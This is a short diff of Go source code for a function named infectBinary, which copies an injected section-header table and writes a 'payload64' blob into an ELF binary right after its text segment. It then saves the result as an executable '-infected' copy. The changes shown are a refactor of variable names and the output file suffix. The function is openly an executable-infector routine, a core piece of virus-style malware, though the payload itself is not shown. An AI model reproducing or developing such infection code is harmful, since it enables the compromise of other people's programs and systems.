@@ -235,19 +235,23 @@ func infectBinary(origFileHandle *os.File, pEnv *string, debug bool) {
 
 	copy(finalInfection[int(oShoff):], infectedShdrTable.Bytes())
 
-	end_of_infection := int(textSegEnd)
+	endOfInfection := int(textSegEnd)
 
-	copy(finalInfectionTwo, finalInfection[:end_of_infection])
+	copy(finalInfectionTwo, finalInfection[:endOfInfection])
+
 	if debug {
 		fmt.Println("[+] writing payload into the binary")
 	}
-	copy(finalInfectionTwo[end_of_infection:], payload64)
-	copy(finalInfectionTwo[end_of_infection + PAGE_SIZE:], finalInfection[end_of_infection:])
-	infectedFileName := fmt.Sprintf("%s-copy", origFileHandle.Name())
+	
+	copy(finalInfectionTwo[endOfInfection:], payload64)
+	copy(finalInfectionTwo[endOfInfection + PAGE_SIZE:], finalInfection[endOfInfection:])
+	infectedFileName := fmt.Sprintf("%s-infected", origFileHandle.Name())
 
 	if err := ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751); err !=nil {
 		fmt.Println(err)
 	}
+	
+	return
 }
 
 
